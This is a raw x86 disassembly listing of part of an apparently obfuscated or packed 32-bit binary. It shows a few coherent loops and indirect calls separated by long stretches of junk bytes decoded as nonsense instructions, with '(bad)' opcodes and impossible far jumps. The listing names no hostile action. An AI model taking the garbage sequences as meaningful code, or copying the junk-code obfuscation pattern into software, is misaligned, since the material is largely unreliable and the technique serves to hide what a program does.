  40854d:	cmp    DWORD PTR ds:0x4325fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4328d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432cc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	test   al,0x2
  408585:	add    al,0xba
  408587:	test   al,0xd4
  408589:	jo     0x4085fb
  40858b:	imul   edi,DWORD PTR [edi+0x70],0x2222db70
  408592:	out    dx,eax
  408593:	fadd   st,st(3)
  408595:	mov    bh,0x2c
  408597:	cmp    bl,BYTE PTR [edx]
  408599:	pop    ds
  40859a:	mov    esp,0x11f7e687
  40859f:	clc    
  4085a0:	pop    edi
  4085a1:	or     ecx,DWORD PTR [edx]
  4085a3:	mov    DWORD PTR [edi],edi
  4085a5:	mov    ch,0xea
  4085a7:	push   esi
  4085a8:	test   ebp,edi
  4085aa:	adc    BYTE PTR [ebx+0x4de1f318],bl
  4085b0:	mov    ah,BYTE PTR [eax-0x41]
  4085b3:	push   esp
  4085b4:	xor    ch,ah
  4085b6:	sti    
  4085b7:	repz push ds
  4085b9:	ret    
  4085ba:	cli    
  4085bb:	clc    
  4085bc:	js     0x40857e
  4085be:	xchg   ecx,eax
  4085bf:	jo     0x40855b
  4085c1:	sub    eax,0x3637079b
  4085c6:	dec    ecx
  4085c7:	into   
  4085c8:	xchg   edi,eax
  4085c9:	out    0xf7,al
  4085cb:	cmp    al,0xb8
  4085cd:	pop    ebx
  4085ce:	in     eax,0x13
  4085d0:	jecxz  0x408638
  4085d2:	fistp  WORD PTR [ebx]
  4085d4:	int    0xc5
  4085d6:	outs   dx,DWORD PTR ds:[esi]
  4085d7:	repnz retf 
  4085d9:	rcl    DWORD PTR [edi],0xd8
  4085dc:	std    
  4085dd:	in     al,dx
  4085de:	jns    0x408594
  4085e0:	aam    0x17
  4085e2:	stc    
  4085e3:	dec    ebp
  4085e4:	ins    BYTE PTR es:[edi],dx
  4085e5:	pop    eax
  4085e6:	out    0xfb,al
  4085e8:	jbe    0x40857c
  4085ea:	stc    
  4085eb:	fistp  QWORD PTR [ebx*8+0x7a60803b]
  4085f2:	jecxz  0x408634
  4085f4:	jmp    0xd874:0x6b86612c
  4085fb:	mov    ds:0x2c8fe8e5,al
  408600:	aad    0xf2
  408602:	mov    ?,ebx
  408604:	mov    eax,ds:0x843ff2e4
  408609:	rcr    esp,1
  40860b:	lock push eax
  40860d:	popf   
  40860e:	add    BYTE PTR [edx-0x6147a002],bh
  408614:	neg    eax
  408616:	mov    bh,0x44
  408618:	mov    al,0x6d
  40861a:	mov    WORD PTR [esi],?
  40861c:	sbb    ebx,DWORD PTR [ebx+0x7e]
  40861f:	adc    eax,0x131785f4
  408624:	cli    
  408625:	jp     0x40869e
  408627:	cs push ds
  408629:	pop    ds
  40862a:	jns    0x4085ca
  40862c:	xchg   ebx,eax
  40862d:	ss xchg ebx,eax
  40862f:	les    ebx,FWORD PTR [edx]
  408631:	adc    al,0x19
  408633:	nop
  408634:	gs or  ch,0xf5
  408638:	cmp    BYTE PTR [edi+0x59c4d869],bl
  40863e:	cmp    dl,cl
  408640:	add    al,BYTE PTR [eax]
  408642:	int    0xf9
  408644:	jb     0x4085f9
  408646:	ret    
  408647:	int3   
  408648:	repz pusha 
  40864a:	jae    0x408644
  40864c:	inc    ebp
  40864d:	push   es
  40864e:	mov    bl,BYTE PTR [ebp-0x7f97186c]
  408654:	push   cs
  408655:	fisttp WORD PTR [esi+0x31b27b52]
  40865b:	pextrw ecx,(bad),0xc5
  40865d:	dec    edi
  40865e:	mov    bl,0x11
  408660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408661:	popf   
  408662:	ret    0xa9e2
  408665:	dec    edi
  408666:	adc    BYTE PTR [ecx],al
  408668:	sar    DWORD PTR [edi-0xd],0x3a
  40866c:	add    cl,BYTE PTR [esi+0x4e]
  40866f:	popa   
  408670:	mov    ds:0x465971cb,eax
  408675:	sub    eax,0x7da0c0d3
  40867a:	sbb    eax,0xfed824e1
  40867f:	adc    al,0xa
  408681:	sbb    edi,DWORD PTR [ecx-0x41]
  408684:	js     0x4086fd
  408686:	outs   dx,BYTE PTR ds:[esi]
  408687:	inc    esi
  408688:	cli    
  408689:	xor    eax,0xbe29c1b
  40868e:	xchg   ebp,edx
  408690:	push   ebx
  408691:	jae    0x40863b
  408693:	mov    edi,DWORD PTR [ebx-0x25]
  408696:	ja     0x40866e
  408698:	sub    esi,DWORD PTR [edi-0x65631150]
  40869e:	jp     0x4086ad
  4086a0:	sahf   
  4086a1:	jae    0x408682
  4086a3:	dec    edx
  4086a4:	mov    dl,0x52
  4086a6:	jl     0x408713
  4086a8:	sar    DWORD PTR [ebp+0x1],0x2f
  4086ac:	outs   dx,BYTE PTR ds:[esi]
  4086ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ae:	mov    ds:0x4d87dc46,eax
  4086b3:	xchg   esi,eax
  4086b4:	pop    ebx
  4086b6:	leavew 
  4086b8:	sub    BYTE PTR [edi],bh
  4086ba:	push   es
  4086bb:	sahf   
  4086bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086bd:	add    eax,0xb24fa406
  4086c2:	mov    ah,BYTE PTR [edi-0x7c]
  4086c5:	or     esi,edi
  4086c7:	cmp    al,0x7f
  4086c9:	xchg   edx,eax
  4086ca:	fld    DWORD PTR [ecx]
  4086cc:	cs mov dl,0x17
  4086cf:	stos   DWORD PTR es:[edi],eax
  4086d0:	test   eax,0xb0309e2
  4086d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086d7:	test   DWORD PTR [ecx],edi
  4086d9:	mov    eax,ds:0x441c45fe
  4086de:	or     eax,0x53fa1e0a
  4086e3:	jmp    0x5c610602
  4086e8:	push   fs
  4086ea:	adc    BYTE PTR [esi+0xf],ah
  4086ed:	loopne 0x40870f
  4086ef:	stc    
  4086f0:	adc    DWORD PTR [ebx+0x44707376],esi
  4086f6:	push   ebp
  4086f7:	loope  0x408732
  4086f9:	pop    edx
  4086fa:	and    DWORD PTR [eax-0x2c],edi
  4086fd:	cwde   
  4086fe:	pop    ebx
  4086ff:	aaa    
  408700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408701:	mov    ebx,0xec6c567e
  408706:	sar    BYTE PTR [edi],0x58
  408709:	les    ecx,FWORD PTR [edi]
  40870b:	sbb    al,0xf
  40870d:	and    ecx,ecx
  40870f:	xchg   esp,eax
  408710:	aad    0x1d
  408712:	push   ebx
  408713:	and    cl,BYTE PTR [edi+edx*1+0x21a349c0]
  40871a:	(bad)  
  40871b:	data16 mov ds:0x304886cd,al
  408721:	or     DWORD PTR [ecx-0x4e1acc75],edx
  408727:	mov    ch,0x16
  408729:	sub    eax,0xcc954bb3
  40872e:	out    0x2,al
  408730:	jg     0x408726
  408732:	in     al,0xfa
  408734:	adc    BYTE PTR [ebx+0xf],ah
  408737:	gs push esp
  408739:	ins    BYTE PTR es:[edi],dx
  40873a:	cmp    eax,0x9a71f356
  40873f:	popf   
  408740:	dec    edi
  408741:	ins    BYTE PTR es:[edi],dx
  408742:	or     DWORD PTR [edx+0x7e],esi
  408745:	inc    edi
  408746:	mov    ecx,0xf635ab3
  40874b:	lods   eax,DWORD PTR ds:[esi]
  40874c:	std    
  40874d:	stos   BYTE PTR es:[edi],al
  40874e:	sub    al,0xd1
  408750:	xchg   esi,eax
  408751:	fst    DWORD PTR [edx+0x55fc15c5]
  408757:	xchg   BYTE PTR ds:0x60dd8766,al
  40875d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40875e:	cmp    bh,BYTE PTR [ecx]
  408760:	mov    dh,0x74
  408762:	sbb    dl,BYTE PTR [esi]
  408764:	push   0x1a3bb424
  408769:	sbb    ebp,DWORD PTR [edx+0x72]
  40876c:	xchg   edx,eax
  40876d:	rcl    DWORD PTR [ecx+0x2e],cl
  408770:	xchg   BYTE PTR [ebx-0x6802010e],al
  408776:	add    BYTE PTR [ebx-0x60],ch
  408779:	xchg   ebx,eax
  40877a:	push   ss
  40877b:	adc    dl,bl
  40877d:	xchg   esp,eax
  40877e:	and    bh,BYTE PTR [eax-0x7f]
  408781:	aaa    
  408782:	or     eax,0x8bf6dd55
  408787:	push   ebp
  408788:	cld    
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43428a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43428a,0x43431d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434315
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43428e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434315,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434272,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432608,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434325,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432cd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43426a,0x13
  408823:	cmp    DWORD PTR ds:0x43426a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43426a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43277d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432bfa
  40884e:	cmp    DWORD PTR ds:0x43426a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43426a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43426a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43426a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43426a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx-0x56c027b5]
  40892a:	(bad)  
  40892b:	mov    eax,ds:0x697070d2
  408930:	jg     0x4089a2
  408932:	jo     0x408907
  408934:	mov    edi,0x19b95143
  408939:	xor    edx,esi
  40893b:	gs ret 0x2f7e
  40893f:	cmp    al,0x43
  408941:	shr    BYTE PTR [ebp+0x54],1
  408944:	inc    ebp
  408945:	pop    eax
  408946:	je     0x4088d2
  408948:	jnp    0x40895d
  40894a:	adc    BYTE PTR [ebp+0x40],cl
  40894d:	inc    esp
  40894e:	js     0x4089cc
  408950:	test   BYTE PTR [eax+0x3e],bl
  408953:	ror    BYTE PTR [ecx-0x6580318a],cl
  408959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40895a:	test   al,0xb
  40895c:	or     eax,0x712257e4
  408961:	in     al,0xcd
  408963:	lea    edx,[ecx-0x1f]
  408966:	and    eax,DWORD PTR [edi-0x44]
  408969:	mov    edi,0x72541e18
  40896e:	stos   WORD PTR es:[edi],ax
  408970:	dec    eax
  408971:	mov    DWORD PTR [edx+esi*1-0x2184ab9f],eax
  408978:	clc    
  408979:	ins    DWORD PTR es:[edi],dx
  40897a:	pop    edx
  40897b:	aas    
  40897c:	cli    
  40897d:	hlt    
  40897e:	jg     0x4089ad
  408980:	xor    eax,0xf1497256
  408985:	xchg   esp,eax
  408986:	ins    BYTE PTR es:[edi],dx
  408987:	adc    BYTE PTR [ecx+0x717a5193],0x9d
  40898e:	mov    ds:0x32714479,eax
  408993:	mov    ds:0x2841156f,al
  408998:	dec    esp
  408999:	hlt    
  40899a:	jno    0x408949
  40899c:	popa   
  40899d:	jno    0x4089a1
  40899f:	in     eax,dx
  4089a0:	and    BYTE PTR [ebp-0x8],ch
  4089a3:	or     esp,DWORD PTR [ebp+0x6291854b]
  4089a9:	xor    DWORD PTR [ebx+0x5d],ebp
  4089ac:	or     edx,DWORD PTR [esi]
  4089ae:	xchg   ebp,eax
  4089af:	xlat   BYTE PTR ds:[ebx]
  4089b0:	cmp    BYTE PTR [edi*1-0x140965ad],dh
  4089b7:	loopne 0x408a28
  4089b9:	nop
  4089ba:	in     al,0x85
  4089bc:	cmp    ch,BYTE PTR [ecx+0x253c0212]
  4089c2:	leave  
  4089c3:	leave  
  4089c4:	jge    0x40897b
  4089c6:	sbb    DWORD PTR [edi],edi
  4089c8:	icebp  
  4089c9:	leave  
  4089ca:	mov    bh,0x1b
  4089cc:	arpl   WORD PTR [ebx-0x3f],sp
  4089cf:	rcl    cl,cl
  4089d1:	jno    0x408a15
  4089d3:	sbb    ebx,esi
  4089d5:	das    
  4089d6:	add    eax,0x49aca758
  4089db:	sub    eax,0x3c2917a5
  4089e0:	pop    esp
  4089e1:	jge    0x4089f4
  4089e3:	xchg   DWORD PTR [ecx-0x2a],esp
  4089e6:	retf   
  4089e7:	add    edx,ebx
  4089e9:	mov    al,ds:0x6034ddd
  4089ee:	ret    
  4089ef:	cmp    bh,al
  4089f1:	and    BYTE PTR [ecx],bl
  4089f3:	xlat   BYTE PTR ds:[ebx]
  4089f4:	pop    ds
  4089f5:	pop    es
  4089f6:	push   ss
  4089f7:	or     eax,DWORD PTR [eax]
  4089f9:	(bad)  [ecx+0x34]
  4089fc:	jnp    0x4089bc
  4089fe:	mov    edx,0x854b81a8
  408a03:	pop    ebx
  408a04:	mov    al,0x47
  408a06:	les    edx,FWORD PTR [ecx+0x6b]
  408a09:	addr16 sti 
  408a0b:	mov    cs,WORD PTR ds:0xdb85adfe
  408a11:	sub    al,BYTE PTR [ebx-0x713e3e68]
  408a17:	arpl   WORD PTR [ebp+0x5eccc092],cx
  408a1d:	mov    bh,0x69
  408a1f:	or     al,0xa7
  408a21:	int    0x24
  408a23:	xchg   esp,eax
  408a24:	in     eax,0x6a
  408a26:	pop    ebx
  408a27:	jl     0x408a1b
  408a29:	xor    BYTE PTR [eax-0x3685f36],ah
  408a2f:	inc    edx
  408a30:	add    ah,BYTE PTR [ebp+0x4a]
  408a33:	jo     0x4089d1
  408a35:	arpl   WORD PTR [edi+0xb0a9a69],ax
  408a3b:	ja     0x408a9d
  408a3d:	mov    edx,eax
  408a3f:	push   es
  408a40:	cld    
  408a41:	xor    ebx,ebx
  408a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a44:	clc    
  408a45:	out    0x98,eax
  408a47:	push   ss
  408a48:	adc    cl,BYTE PTR [eax-0x2e]
  408a4b:	sub    dl,ah
  408a4d:	jno    0x408a46
  408a4f:	imul   ebp,DWORD PTR [ebp-0x36],0x52
  408a53:	fisub  WORD PTR [eax]
  408a55:	out    dx,eax
  408a56:	inc    edi
  408a57:	les    ebp,FWORD PTR [eax]
  408a59:	test   DWORD PTR [ebx],ebp
  408a5b:	popa   
  408a5c:	call   0x3f3:0x1e2f6f99
  408a63:	mov    esp,0x8e7421d5
  408a68:	shl    dh,1
  408a6a:	rcl    bl,1
  408a6c:	call   0x4fbf4b25
  408a71:	enter  0xbbe9,0x18
  408a75:	mov    eax,ds:0xff510fc9
  408a7a:	mov    bl,0x87
  408a7c:	push   ss
  408a7d:	jmp    0x2a27:0x83f21438
  408a84:	cmp    eax,0x2934d83b
  408a89:	repz aam 0xc
  408a8c:	(bad)  
  408a8d:	mov    ebp,0xb5b61523
  408a92:	ds push es
  408a94:	mov    dl,0x41
  408a96:	sub    al,0xc7
  408a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a99:	jns    0x408a25
  408a9b:	in     eax,0xc5
  408a9d:	inc    ebp
  408a9e:	not    BYTE PTR [ebp-0x66]
  408aa1:	pop    ebx
  408aa2:	mov    BYTE PTR [ebp+0xa6568e6],dh
  408aa8:	inc    edi
  408aa9:	xchg   ebx,eax
  408aaa:	pop    eax
  408aab:	(bad)  
  408aac:	ffreep st(2)
  408aae:	out    dx,eax
  408aaf:	icebp  
  408ab0:	cmp    eax,0x6ab6e2ea
  408ab5:	stc    
  408ab6:	loope  0x408b02
  408ab8:	out    dx,al
  408ab9:	mov    ds:0xecefcf12,al
  408abe:	fiadd  DWORD PTR [ebp-0x1f2d259c]
  408ac4:	enter  0x1289,0xe1
  408ac8:	popf   
  408ac9:	jb     0x408abd
  408acb:	add    bh,BYTE PTR [ebp-0x1afc5d7b]
  408ad1:	rcl    esi,cl
  408ad3:	push   ebx
  408ad4:	xchg   BYTE PTR [ebp+0x5dbd432e],dl
  408ada:	push   ebx
  408adb:	adc    DWORD PTR [edi],ebp
  408add:	int    0xa2
  408adf:	cld    
  408ae0:	ja     0x408ae8
  408ae2:	pop    eax
  408ae3:	dec    esi
  408ae4:	ret    
  408ae5:	cmp    DWORD PTR [ebp+0x66b68e3],0x3b
  408aec:	mov    eax,ds:0x8262e14d
  408af1:	pop    ebp
  408af2:	sahf   
  408af3:	clc    
  408af4:	dec    edi
  408af5:	inc    ebp
  408af6:	js     0x408b66
  408af8:	lds    eax,FWORD PTR [ebx+0x3]
  408afb:	dec    esp
  408afc:	mov    DWORD PTR [edx],esi
  408afe:	shr    BYTE PTR [ebx],0xd6
  408b01:	sub    al,0xe
  408b03:	test   eax,0x9a47ddb5
  408b08:	(bad)  [eax+edx*2+0x53331ad1]
  408b0f:	xor    DWORD PTR [edi+0x67],esp
  408b12:	xlat   BYTE PTR ds:[ebx]
  408b13:	pcmpgtb mm3,QWORD PTR [ebp-0x4893e5b4]
  408b1a:	pop    edi
  408b1b:	mov    bh,0xaa
  408b1d:	mov    dh,0xbd
  408b1f:	lock push ebx
  408b21:	jmp    DWORD PTR [edi+0x36ba716f]
  408b27:	(bad)  
  408b28:	xchg   ebx,eax
  408b29:	xchg   ecx,eax
  408b2a:	mov    edi,DWORD PTR [ebp-0x4]
  408b2d:	xor    edi,eax
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	stos   DWORD PTR es:[edi],eax
  408b92:	stos   BYTE PTR es:[edi],al
  408b93:	in     al,0xf
  408b95:	call   0x707f:0x697070d0
  408b9c:	jo     0x408bc9
  408b9e:	inc    edx
  408b9f:	int3   
  408ba0:	jge    0x408b8a
  408ba2:	mov    ah,ch
  408ba4:	xor    BYTE PTR [ebx-0x20],0xeb
  408ba8:	ret    
  408ba9:	shl    DWORD PTR [ebx-0x57],1
  408bac:	sahf   
  408bad:	mov    ds:0xb4e118ce,al
  408bb2:	sub    al,0xe0
  408bb4:	popa   
  408bb5:	sbb    ebp,esp
  408bb7:	repnz hlt 
  408bb9:	cmp    al,0x8e
  408bbb:	pusha  
  408bbc:	or     BYTE PTR [esp+eax*2-0x69],0x75
  408bc1:	mov    eax,0x355b2b2b
  408bc6:	or     al,0xe1
  408bc8:	sub    DWORD PTR [esi],ecx
  408bca:	lods   eax,DWORD PTR ds:[esi]
  408bcb:	jg     0x408ba3
  408bcd:	dec    ecx
  408bce:	or     cl,cl
  408bd0:	(bad)  
  408bd1:	loop   0x408bf8
  408bd3:	outs   dx,DWORD PTR ds:[esi]
  408bd4:	push   ebp
  408bd5:	in     al,0x9
  408bd7:	xor    ch,BYTE PTR [esi-0x63d4bc79]
  408bdd:	push   0x4ed79c16
  408be2:	lds    edx,FWORD PTR [eax]
  408be4:	or     BYTE PTR [edi+0x54],0xfa
  408be8:	sub    eax,0xb1233447
  408bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bee:	xchg   ebx,eax
  408bef:	pop    es
  408bf0:	inc    edx
  408bf1:	or     DWORD PTR [ebx+0x50e1dc7d],ebx
  408bf7:	xchg   ebx,eax
  408bf8:	or     BYTE PTR [ebx+ecx*2+0x56],bh
  408bfc:	mov    esi,0x11715d4f
  408c01:	fstp   TBYTE PTR [edx]
  408c03:	dec    esp
  408c04:	push   es
  408c05:	add    edx,DWORD PTR [ebx-0x474cb51e]
  408c0b:	mov    bl,0xca
  408c0d:	pop    esp
  408c0e:	cmc    
  408c0f:	and    DWORD PTR [esi],esi
  408c11:	mov    ebp,ebp
  408c13:	lods   eax,DWORD PTR ds:[esi]
  408c14:	enter  0x3763,0x9f
  408c18:	dec    eax
  408c19:	mov    ds:0x55f0be83,eax
  408c1e:	add    esp,DWORD PTR [esi+0x29]
  408c21:	jle    0x408c52
  408c23:	and    al,cl
  408c25:	(bad)  
  408c26:	(bad)  
  408c27:	dec    esp
  408c28:	mov    esp,0x5f6ce312
  408c2d:	iret   
  408c2e:	pushf  
  408c2f:	fst    DWORD PTR [ebx]
  408c31:	outs   dx,BYTE PTR ds:[esi]
  408c32:	std    
  408c33:	xor    eax,0xe2d902de
  408c38:	dec    ebx
  408c39:	jns    0x408c45
  408c3b:	inc    ecx
  408c3c:	addr16 ret 
  408c3e:	into   
  408c3f:	sub    al,0xdb
  408c41:	hlt    
  408c42:	test   BYTE PTR [edi-0x6d1f81f],bl
  408c48:	jo     0x408be6
  408c4a:	(bad)  
  408c4c:	jb     0x408c96
  408c4e:	and    DWORD PTR [ecx],esi
  408c50:	scas   eax,DWORD PTR es:[edi]
  408c51:	mov    eax,0xc279d565
  408c56:	inc    edi
  408c57:	mov    ch,0x90
  408c59:	test   eax,0x872d13a7
  408c5e:	xchg   esp,eax
  408c5f:	xor    ah,cl
  408c61:	inc    ebp
  408c62:	xchg   DWORD PTR [edx],eax
  408c64:	test   al,0x18
  408c66:	aad    0x81
  408c68:	xchg   esi,eax
  408c69:	sub    eax,0x9c4452a5
  408c6e:	mov    esi,0x2080fd41
  408c73:	cmp    eax,0x479fef2e
  408c78:	cs pop esp
  408c7a:	rcr    dh,0x54
  408c7d:	xchg   esp,eax
  408c7e:	pop    ds
  408c7f:	loop   0x408c1b
  408c81:	(bad)  
  408c82:	cli    
  408c83:	inc    BYTE PTR ds:0x362621a
  408c89:	xor    BYTE PTR [edi],dl
  408c8b:	jge    0x408cb9
  408c8d:	cmp    eax,DWORD PTR [esi-0x77fd056c]
  408c93:	or     DWORD PTR [edx-0x2f5f705c],0x2b0ed47b
  408c9d:	adc    DWORD PTR [ecx-0x7a6da349],0xaee2df29
  408ca7:	inc    ebx
  408ca8:	mov    cl,dl
  408caa:	stc    
  408cab:	mov    al,ds:0x4ac6c603
  408cb0:	out    0x2d,eax
  408cb2:	jmp    0x36d6beac
  408cb7:	inc    esi
  408cb8:	dec    ebx
  408cb9:	push   0x6d0e2f34
  408cbe:	mov    ch,0x95
  408cc0:	adc    al,0x0
  408cc2:	and    ebp,0x57c02139
  408cc8:	jp     0x408cf6
  408cca:	mov    ds:0x8d85cf39,al
  408ccf:	fild   DWORD PTR [esi-0xe1faef2]
  408cd5:	sub    WORD PTR [esi+0x1a],sp
  408cd9:	leave  
  408cda:	in     al,dx
  408cdb:	in     eax,dx
  408cdc:	xor    al,0xc0
  408cde:	test   eax,0x491b0721
  408ce3:	sbb    ch,cl
  408ce5:	out    0x18,al
  408ce7:	stc    
  408ce8:	add    al,0xa7
  408cea:	iret   
  408ceb:	js     0x408cb0
  408ced:	pushf  
  408cee:	sti    
  408cef:	mov    edx,0x12a43554
  408cf4:	mov    al,0x92
  408cf6:	es dec ebx
  408cf8:	retf   
  408cf9:	and    DWORD PTR [ebx+0x54],eax
  408cfc:	xor    al,0x15
  408cfe:	daa    
  408cff:	adc    bh,BYTE PTR ds:0xea5a6516
  408d05:	add    BYTE PTR [edi],ch
  408d07:	mov    esi,0xb2009189
  408d0c:	js     0x408d44
  408d0e:	in     al,0xcd
  408d10:	mov    ds:0x2fa67463,al
  408d15:	mov    ds:0xa80f941d,al
  408d1a:	retf   
  408d1b:	jp     0x408d82
  408d1d:	xor    BYTE PTR [ebx-0x5c],0x89
  408d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d22:	sub    bh,bl
  408d24:	push   0x3bb2d9bb
  408d29:	jg     0x408cc9
  408d2b:	sahf   
  408d2c:	adc    dl,BYTE PTR [edi-0x21b19dfa]
  408d32:	rcr    DWORD PTR [esp+esi*1+0x5b],cl
  408d36:	dec    esp
  408d37:	push   0xffffffab
  408d39:	cmp    ah,BYTE PTR [edx]
  408d3b:	sbb    BYTE PTR [edi-0x7c206ce8],ch
  408d41:	mov    bh,0xba
  408d43:	and    al,0x84
  408d45:	(bad)  
  408d46:	jns    0x408d43
  408d48:	in     eax,dx
  408d49:	mov    WORD PTR [edi+ebp*2+0x38],ss
  408d4d:	repnz repnz pop esp
  408d50:	pop    edx
  408d51:	jno    0x408cdc
  408d53:	rol    BYTE PTR [edx+0x45a2ace],1
  408d59:	mov    ch,0xc5
  408d5b:	pop    ebx
  408d5c:	sbb    DWORD PTR [ebx-0xbd78245],ecx
  408d62:	mov    esi,0x48da1fba
  408d67:	xor    dl,dh
  408d69:	repz mov al,ds:0xf3b56a07
  408d6f:	repz pop ebx
  408d71:	xor    ch,al
  408d73:	lods   al,BYTE PTR ds:[esi]
  408d74:	rol    dh,1
  408d76:	inc    eax
  408d77:	push   ebp
  408d78:	mov    ah,0xd5
  408d7a:	aas    
  408d7b:	pop    edx
  408d7c:	pop    ds
  408d7d:	xor    DWORD PTR [eax-0x7a],eax
  408d80:	adc    al,0xd6
  408d82:	jmp    0xabbd:0xfd7680e5
  408d89:	adc    ebp,esp
  408d8b:	out    dx,al
